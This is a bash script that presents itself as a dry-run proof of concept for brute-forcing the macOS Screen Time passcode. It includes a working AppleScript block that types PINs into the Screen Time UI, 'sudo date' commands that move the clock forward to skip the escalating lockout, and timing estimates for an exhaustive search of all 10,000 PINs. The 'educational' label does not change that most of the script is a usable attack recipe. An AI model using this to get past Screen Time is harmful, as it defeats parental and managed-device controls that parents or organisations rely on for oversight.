#!/bin/bash
# bruteforce_ui.sh
# Screen Time passcode brute-force via UI automation + clock manipulation.
#
# This is the PRACTICAL attack that actually works. It exploits two weaknesses:
# 1. The lockout timer uses NSDate (wall clock), not monotonic time
# 2. The PIN entry UI is accessible via macOS Accessibility APIs
#
# Attack flow:
# - Enter PINs via AppleScript/osascript UI automation
# - After 5 failures, the lockout timer activates (1min → 5min → 15min → 1hr)
# - Advance system clock past the lockout expiry
# - Resume brute-forcing
# - 10,000 PINs / 5 per cycle = 2,000 cycles
# - With clock manipulation, each cycle takes ~5 seconds
# - Total time: ~2.7 hours for exhaustive search, ~1.3 hours on average
#
# REQUIREMENTS:
# - Accessibility permissions for Terminal/script runner
# - sudo access (to change system time)
# - Screen Time preferences pane open
#
# NOTE: The force_date_time_configuration blueprint may prevent clock changes
# on managed devices. Check with: screentimediagnose inspect | grep force_date
#
# THIS IS A PROOF OF CONCEPT FOR EDUCATIONAL/RESEARCH PURPOSES ONLY.

set -e

echo "=== Screen Time Passcode Brute-Force (UI Automation) ==="
echo ""
echo "This PoC demonstrates the clock manipulation + UI automation attack."
echo "It does NOT actually run — it shows the technique."
echo ""

# Check prerequisites
echo "Checking prerequisites..."
echo "  SIP status: $(csrutil status 2>&1)"
echo "  Current time: $(date)"

# Check if date/time is enforced
FORCE_DATE=$(/System/Library/PrivateFrameworks/ScreenTimeCore.framework/screentimediagnose --format JSON inspect 2>/dev/null | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    users = data.get('users', {})
    for user_key, user in users.items():
        blueprints = user.get('blueprints', {})
        for bp_key, bp in blueprints.items():
            configs = bp.get('configurations', {})
            for cfg_key, cfg in configs.items():
                if 'date' in cfg.get('type', '').lower() or 'time' in cfg.get('type', '').lower():
                    print(f'FOUND: {cfg_key} (type: {cfg[\"type\"]})')
    print('NONE')
except:
    print('ERROR')
" 2>/dev/null || echo "UNKNOWN")

echo "  Date/time enforcement: $FORCE_DATE"
echo ""

if [[ "$FORCE_DATE" == *"FOUND"* ]]; then
    echo "⚠ WARNING: force_date_time_configuration is active!"
    echo "  The managed device may prevent clock changes."
    echo "  The attack may still work if the enforcement only prevents"
    echo "  UI-based time changes but allows sudo date."
    echo ""
fi

echo "--- Attack Algorithm ---"
echo ""
echo "The brute-force works in cycles of 5 attempts:"
echo ""
echo "  for pin in 0000..9999:"
echo "    1. Open Screen Time preferences (if not already open)"
echo "    2. Click 'Change Passcode' or trigger PIN entry UI"
echo "    3. Enter the PIN via keystroke injection"
echo "    4. Check result (success = found, failure = continue)"
echo "    5. After 5 failures, lockout activates"
echo "    6. Advance system clock: sudo date -f '%Y%m%d%H%M' '202603091200'"
echo "    7. Wait 1 second for ScreenTimeAgent to re-evaluate"
echo "    8. Reset clock: sudo sntp -sS time.apple.com"
echo "    9. Continue from step 2"
echo ""
echo "--- AppleScript PIN Entry ---"
echo ""
echo "The following AppleScript enters a PIN into the Screen Time UI:"
echo ""
cat << 'APPLESCRIPT'
tell application "System Events"
    -- Find the Screen Time passcode field
    tell process "ScreenTimeViewService"
        set frontmost to true
        delay 0.3
        
        -- Type the 4-digit PIN
        keystroke "1234"
        delay 0.2
        
        -- Press Enter to submit
        keystroke return
        delay 1
        
        -- Check for error (wrong PIN shows an alert)
        if exists sheet 1 of window 1 then
            -- Wrong PIN
            click button "OK" of sheet 1 of window 1
        end if
    end tell
end tell
APPLESCRIPT

echo ""
echo "--- Clock Manipulation ---"
echo ""
echo "After 5 failed attempts, the lockout timer uses NSDate:"
echo ""
echo "  # ScreenTimeAgent stores: passcodeEntryTimeoutEndDate = [NSDate dateWithTimeIntervalSinceNow:3600]"
echo "  # This creates an absolute timestamp like: 2026-03-08 19:00:00"
echo "  # Advancing the clock past this timestamp bypasses the lockout:"
echo "  sudo date 030820002026  # March 8, 20:00, 2026"
echo "  # Then reset:"
echo "  sudo sntp -sS time.apple.com"
echo ""
echo "--- Lockout Escalation ---"
echo ""
echo "  Failures 1-5:  No lockout"
echo "  Failure 6:     1 minute lockout"
echo "  Failure 7:     5 minute lockout"
echo "  Failure 8:     15 minute lockout"
echo "  Failure 9+:    1 hour lockout"
echo ""
echo "  With clock manipulation, all lockouts are bypassed instantly."
echo "  Total: 10,000 PINs / 5 per cycle = 2,000 clock advances"
echo ""
echo "=== PoC complete (dry run) ==="
